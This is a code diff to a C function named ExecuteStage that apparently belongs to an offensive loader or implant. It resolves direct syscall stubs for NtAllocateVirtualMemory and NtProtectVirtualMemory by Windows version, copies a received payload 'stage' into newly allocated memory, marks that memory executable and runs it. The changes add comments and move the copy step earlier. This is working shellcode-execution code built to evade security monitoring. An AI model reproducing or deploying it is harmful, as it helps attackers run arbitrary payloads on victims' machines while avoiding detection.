@@ -28,19 +28,22 @@ VOID ExecuteStage(CHAR* Stage, DWORD sSize)
     // resolve so we can use this later to identify what syscall we need
     RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");
 
+    // fill the osinfo struct
     RtlGetVersion(&osInfo);
 
+    // resolve the syscalls we need
     if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
     {
         NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
         NtProtectVirtualMemory  = &NtProtectVirtualMemory10;
-    } 
+    }
     else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
     {
         NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
         NtProtectVirtualMemory  = &NtProtectVirtualMemory81;
     }
-    
+
+    // alloc the memory we need
     status = NtAllocateVirtualMemory(GetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
     if (status != 0)
     {
@@ -48,15 +51,18 @@ VOID ExecuteStage(CHAR* Stage, DWORD sSize)
         return;
     }
 
+    // copy the memory into the allocated memory
+    memcpy(pBuffer, Stage, sSize);
+
+    // change the permisions to PAGE_EXECUTE_READWRITE
     status = NtProtectVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, PAGE_EXECUTE_READWRITE, &OldPro);
-    if (status != 0) 
+    if (status != 0)
     {
         DEBUG("Failed to NtProtectVirtualMemory10");
         return;
     }
 
-    memcpy(pBuffer, Stage, sSize);
-
+    // execute the code
     ((void(*)())pBuffer)();
 
     return;
